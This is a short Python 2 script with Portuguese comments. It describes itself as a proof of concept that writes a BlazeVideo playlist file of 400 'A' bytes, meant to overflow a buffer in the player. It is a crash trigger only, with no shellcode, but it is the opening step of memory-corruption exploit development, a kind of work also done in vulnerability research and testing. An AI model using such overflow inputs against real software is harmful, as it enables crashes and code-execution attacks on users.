#!/usr/bin/python

# POC de criacao de uma playlist para blazevideo

import struct
file = "playlist-blazevideo.plf"

# estouro com 400 bytes
payload = "A" * 400

f = open(file,'w')
print "Criando uma Playlist de 400 bytes..."
f.write(payload)
print "Arquivo ",file, " Criado"
f.close()
